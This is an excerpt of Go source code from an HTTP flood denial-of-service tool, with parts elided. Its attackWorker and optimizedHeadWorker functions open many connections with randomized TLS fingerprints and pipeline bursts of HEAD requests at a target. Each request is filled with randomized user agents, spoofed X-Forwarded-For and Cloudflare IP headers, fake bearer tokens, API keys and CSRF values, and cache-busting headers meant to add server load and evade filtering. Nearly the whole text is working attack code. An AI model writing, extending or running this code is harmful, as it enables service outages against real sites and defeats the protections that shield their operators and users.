	...
	if h2Supported && mode == "GET" {
		...
		for i := 0; i < workers; i++ {
			...
			go func(id int) {
				defer wg.Done()
				if mode == "HEAD" {
					optimizedHeadWorker(target, u.Host, done, stats, useProxy)
				} else {
					attackWorker(target, u.Host, mode, done, stats, useProxy)
				}
			}(i)
...
// NEW: Optimized HEAD worker with reused connections, 2-second timeout, and pipelining
func optimizedHeadWorker(target, host string, done chan struct{}, stats *atomicCounter, useProxy bool) {
	...
	for {
		...
		case <-done:
			return
		default:
			// REUSED CONNECTION - Dial with timeout
			var conn net.Conn
			var err error
			...
			if u.Scheme == "https" {
				...
				conn, err = tls.DialWithDialer(dialer, "tcp", address, getRandomTLSProfile())
			} else {
				// Plain TCP with timeout
			...
			// PIPELINING - Send multiple HEAD requests in one connection
			for pipelineIdx := 0; pipelineIdx < 30; pipelineIdx++ {
				select {
				case <-done:
					conn.Close()
					return
				default:
					...
					// Build HEAD request with ALL spoofing headers
					request := fmt.Sprintf("HEAD %s HTTP/1.1\r\n", path)
					request += fmt.Sprintf("Host: %s\r\n", host)
					
					// Basic headers
					request += fmt.Sprintf("User-Agent: %s\r\n", randomUA())
					request += fmt.Sprintf("Referer: %s\r\n", randomReferer())
					request += "Connection: keep-alive\r\n"
					
					// Accept headers
					request += fmt.Sprintf("Accept: %s\r\n", acceptHeaders[randInt(0, len(acceptHeaders)-1)])
					request += fmt.Sprintf("Accept-Language: %s\r\n", acceptLanguages[randInt(0, len(acceptLanguages)-1)])
					request += fmt.Sprintf("Accept-Encoding: %s\r\n", acceptEncodings[randInt(0, len(acceptEncodings)-1)])
					
					// Cache control
					request += fmt.Sprintf("Cache-Control: %s\r\n", cacheControls[randInt(0, len(cacheControls)-1)])
					if randBool() {
					...
					if provider == "cloudflare" || randInt(1, 100) <= 40 {
						...
						request += fmt.Sprintf("X-Forwarded-For: %s\r\n", cfIP)
						request += fmt.Sprintf("X-Real-IP: %s\r\n", cfIP)
					}
							...
							for k, v := range appHeader {
								if v == "" {
									...
									case "X-CSRF-Token":
										request += fmt.Sprintf("%s: %s\r\n", k, randomBase64(32))
									case "Authorization":
										request += fmt.Sprintf("%s: Bearer %s\r\n", k, randomBase64(48))
									case "X-API-Key":
										request += fmt.Sprintf("%s: %s\r\n", k, randomHex(16))
									case "X-Device-ID":
										request += fmt.Sprintf("%s: %s\r\n", k, generateUUID())
					...
					// HEAD-specific headers for extra processing
					if randBool() {
						request += fmt.Sprintf("If-Modified-Since: %s\r\n", time.Now().Add(-24*time.Hour).Format(http.TimeFormat))
					}
					if randBool() {
						request += fmt.Sprintf("If-None-Match: \"%s\"\r\n", randomHex(8))
					}
					if randInt(1, 100) <= 15 {
						start := randInt(0, 1000)
						end := randInt(1001, 10000)
						request += fmt.Sprintf("Range: bytes=%d-%d\r\n", start, end)
					}
					...
					if randBool() {
						...
						request += fmt.Sprintf("TE: %s\r\n", teValues[randInt(0, len(teValues)-1)])
					}
					
					// Original X-Forwarded-For (if not set)
					if !strings.Contains(request, "X-Forwarded-For:") && randInt(1, 100) <= 30 {
						request += fmt.Sprintf("X-Forwarded-For: %s\r\n", generateRandomIP())
					}
					...
					// Tiny delay to prevent local overwhelm
					time.Sleep(1 * time.Millisecond)
				}
			}
			
			// 2-SECOND TIMEOUT - Quick read of responses (optional)
			conn.SetReadDeadline(time.Now().Add(2 * time.Second))
			respBuf := make([]byte, 4096)
			conn.Read(respBuf) // Read whatever responses came back
